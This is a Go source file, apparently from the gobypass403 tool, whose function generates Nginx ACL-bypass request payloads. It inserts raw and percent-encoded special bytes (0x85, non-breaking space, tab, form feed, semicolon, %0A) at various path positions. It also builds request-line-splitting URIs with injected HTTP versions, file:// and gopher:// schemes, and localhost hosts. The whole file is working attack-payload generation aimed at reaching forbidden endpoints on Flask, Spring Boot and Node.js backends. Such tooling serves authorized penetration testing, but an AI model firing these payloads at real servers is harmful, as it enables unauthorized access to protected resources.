package payload

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

/*
GenerateNginxACLsBypassPayloads
*/
func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	basePath := parsedURL.Path

	// Extract query string if it exists
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		BypassModule: bypassModule,
	}

	// Define comprehensive bypass character sets
	// Raw bytes must be used directly in the string via byte conversion

	// Flask bypass characters
	flaskBypassBytes := []byte{
		0x85, // Next line character
		0xA0, // Non-breaking space
		0x1F, // Information separator one
		0x1E, // Information separator two
		0x1D, // Information separator three
		0x1C, // Information separator four
		0x0C, // Form feed
		0x0B, // Vertical tab
	}

	// Spring Boot bypass characters
	springBootBypassBytes := []byte{
		0x09, // Tab character
	}
	springBootStrings := []string{";"}

	// Node.js bypass characters
	nodejsBypassBytes := []byte{
		0xA0, // Non-breaking space
		0x09, // Tab character
		0x0C, // Form feed
	}

	// Combine all unique bypass characters
	rawBypassChars := make([]string, 0)
	encodedBypassChars := make([]string, 0)
	charMap := make(map[string]bool) // To track uniqueness

	// Process byte-based characters
	processBytes := func(bytes []byte) {
		for _, b := range bytes {
			// Raw character
			rawChar := string([]byte{b})
			if !charMap[rawChar] {
				rawBypassChars = append(rawBypassChars, rawChar)
				charMap[rawChar] = true
			}

			// URL-encoded version
			encodedChar := fmt.Sprintf("%%%02X", b)
			encodedBypassChars = append(encodedBypassChars, encodedChar)
		}
	}

	// Add all byte-based characters
	processBytes(flaskBypassBytes)
	processBytes(springBootBypassBytes)
	processBytes(nodejsBypassBytes)

	// Add string-based characters
	for _, s := range springBootStrings {
		if !charMap[s] {
			rawBypassChars = append(rawBypassChars, s)
			charMap[s] = true
		}
		// No need to URL-encode simple ASCII characters like semicolon
		encodedBypassChars = append(encodedBypassChars, url.QueryEscape(s))
	}

	// Add the %0A character (newline) since it can cut the path (Nginx rewrite)
	// Keep the raw '\n' in rawBypassChars for non-URI based tests if needed elsewhere,
	// but only use encodedNewline ('%0A') for URI construction below.
	if !charMap["\n"] {
		rawBypassChars = append(rawBypassChars, "\n")
		charMap["\n"] = true
	}
	encodedNewline := "%0A" // Use this consistently for URIs
	encodedBypassChars = append(encodedBypassChars, encodedNewline)

	// Split the path into segments to insert characters at various positions
	pathSegments := strings.Split(strings.TrimPrefix(basePath, "/"), "/")

	// Helper function to add a job with a specific URI
	addJob := func(uri string, headers ...Headers) {
		job := baseJob
		job.RawURI = uri
		if len(headers) > 0 {
			job.Headers = headers
		}
		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)
	}

	// 1. Generate payloads by appending characters to the end of the path
	for _, char := range rawBypassChars {
		// Only add raw characters if they are not problematic for fasthttp URI parsing
		if char != "\n" {
			addJob(basePath + char + query)
		}
	}
	for _, encoded := range encodedBypassChars {
		addJob(basePath + encoded + query)
	}

	// 2. Try after a trailing slash if the path doesn't already end with one
	if !strings.HasSuffix(basePath, "/") {
		for _, char := range rawBypassChars {
			if char != "\n" {
				addJob(basePath + "/" + char + query)
			}
		}
		for _, encoded := range encodedBypassChars {
			addJob(basePath + "/" + encoded + query)
		}
	}

	// 3. Insert characters at the beginning of the path
	for _, char := range rawBypassChars {
		if char != "\n" {
			addJob("/" + char + strings.TrimPrefix(basePath, "/") + query)
		}
	}
	for _, encoded := range encodedBypassChars {
		addJob("/" + encoded + strings.TrimPrefix(basePath, "/") + query)
	}

	// 4a. Insert characters immediately AFTER each path segment (except the last)
	// Generates patterns like /segment1<char>/segment2...
	if len(pathSegments) > 1 {
		for i := 0; i < len(pathSegments)-1; i++ { // Iterate up to the second-to-last segment
			// Join segments up to and including i
			prefix := "/" + strings.Join(pathSegments[:i+1], "/")
			// Join segments after i, adding a leading slash
			suffix := "/" + strings.Join(pathSegments[i+1:], "/")

			for _, char := range rawBypassChars {
				if char != "\n" {
					addJob(prefix + char + suffix + query)
				}
			}
			for _, encoded := range encodedBypassChars {
				addJob(prefix + encoded + suffix + query)
			}
		}
	}

	// 4b. Insert characters immediately BEFORE each path segment (except the first)
	// Generates patterns like /segment1/<char>segment2...
	if len(pathSegments) > 1 {
		for i := 1; i < len(pathSegments); i++ { // Iterate starting from the second segment
			// Join segments before i, adding a leading slash
			prefix := "/" + strings.Join(pathSegments[:i], "/")
			// Get the current segment
			currentSegment := pathSegments[i]
			// Get the rest of the path segments after the current one
			restOfPath := ""
			if i < len(pathSegments)-1 {
				restOfPath = "/" + strings.Join(pathSegments[i+1:], "/")
			}

			for _, char := range rawBypassChars {
				if char != "\n" {
					addJob(prefix + "/" + char + currentSegment + restOfPath + query)
				}
			}
			for _, encoded := range encodedBypassChars {
				addJob(prefix + "/" + encoded + currentSegment + restOfPath + query)
			}
		}
	}

	// 5. NEW: Insert characters after the first character of each path segment
	for i, segment := range pathSegments {
		if len(segment) >= 2 { // Must have at least 2 characters
			// Create path prefix (everything before current segment)
			prefix := "/"
			if i > 0 {
				prefix = "/" + strings.Join(pathSegments[:i], "/") + "/"
			}

			// Create path suffix (everything after current segment)
			suffix := ""
			if i < len(pathSegments)-1 {
				suffix = "/" + strings.Join(pathSegments[i+1:], "/")
			}

			// Insert characters after first character of segment
			firstChar := segment[0:1]
			restOfSegment := segment[1:]

			for _, char := range rawBypassChars {
				if char != "\n" {
					modifiedPath := prefix + firstChar + char + restOfSegment + suffix + query
					addJob(modifiedPath)
				}
			}
			for _, encoded := range encodedBypassChars {
				modifiedPath := prefix + firstChar + encoded + restOfSegment + suffix + query
				addJob(modifiedPath)
			}
		}
	}

	// HTTP version-like strings
	httpVersions := []string{
		"HTTP/1.1",
		"HTTP/1.0",
		"HTTP/2.0",
		"HTTP/0.9",
	}

	// 6. Generate whitespace+HTTP version payloads
	for _, httpVersion := range httpVersions {
		// URL-encoded newline ONLY
		addJob(basePath + encodedNewline + httpVersion + query)

		// Try at path segment positions
		if len(pathSegments) > 1 {
			for i := 0; i < len(pathSegments); i++ {
				prefix := "/" + strings.Join(pathSegments[:i], "/")
				if i > 0 {
					prefix += "/"
				}

				suffix := ""
				if i < len(pathSegments) {
					suffix = "/" + strings.Join(pathSegments[i:], "/")
				}

				// URL-encoded newline ONLY
				addJob(prefix + encodedNewline + httpVersion + suffix + query)
			}
		}
	}

	// Scheme techniques
	schemes := []string{
		"http://",
		"https://",
		"file://",
		"gopher://",
	}

	// Alternative hosts
	alternativeHosts := []string{
		"localhost",
		"127.0.0.1",
	}

	// Add port variants
	if parsedURL.Port != "" {
		alternativeHosts = append(alternativeHosts,
			"localhost:"+parsedURL.Port,
			"127.0.0.1:"+parsedURL.Port)
	} else {
		alternativeHosts = append(alternativeHosts,
			"localhost:80", "localhost:443",
			"127.0.0.1:80", "127.0.0.1:443")
	}

	// 7. Complex bypass patterns with host routing
	for _, httpVersion := range httpVersions {
		for _, scheme := range schemes {
			for _, altHost := range alternativeHosts {
				// URL-encoded newlines ONLY
				encodedUri := basePath + encodedNewline + httpVersion + encodedNewline + scheme + altHost + basePath + query

				// Basic encoded variant
				addJob(encodedUri)

				// With explicit Host header
				addJob(encodedUri, Headers{
					Header: "Host",
					Value:  parsedURL.Host,
				})

				// With original host (using encoded newline)
				addJob(basePath + encodedNewline + httpVersion + encodedNewline + scheme + parsedURL.Host + basePath + query)

				// Try at different path segments
				if len(pathSegments) > 1 {
					for i := 0; i < len(pathSegments); i++ {
						prefix := "/" + strings.Join(pathSegments[:i], "/")
						if i > 0 {
							prefix += "/"
						}

						suffix := ""
						if i < len(pathSegments) {
							suffix = "/" + strings.Join(pathSegments[i:], "/")
						}

						// URL-encoded newlines ONLY with alternative host
						encodedSegmentUri := prefix + encodedNewline + httpVersion + encodedNewline + scheme + altHost + basePath + suffix + query
						addJob(encodedSegmentUri)

						// With explicit Host header
						addJob(encodedSegmentUri, Headers{
							Header: "Host",
							Value:  parsedURL.Host,
						})

						// URL-encoded newlines ONLY with original host
						encodedOrigHostSegmentUri := prefix + encodedNewline + httpVersion + encodedNewline + scheme + parsedURL.Host + basePath + suffix + query
						addJob(encodedOrigHostSegmentUri)

						// With explicit Host header
						addJob(encodedOrigHostSegmentUri, Headers{
							Header: "Host",
							Value:  parsedURL.Host,
						})
					}
				}
			}
		}
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d Nginx bypass payloads for %s\n", len(allJobs), targetURL)
	return allJobs
}
